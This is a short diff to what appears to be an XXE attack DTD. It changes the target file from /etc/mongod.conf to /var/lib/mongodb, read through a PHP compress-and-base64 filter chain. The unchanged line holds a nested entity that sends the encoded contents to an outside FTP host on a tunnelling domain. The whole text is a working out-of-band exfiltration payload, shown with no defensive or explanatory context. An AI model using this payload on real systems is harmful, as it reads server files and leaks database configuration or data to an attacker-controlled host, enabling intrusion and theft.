@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/mongod.conf">
+<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=file:///var/lib/mongodb">
 <!ENTITY % inception "<!ENTITY exfil SYSTEM 'ftp://idlewog.jprq.site:37169/%data;'>">
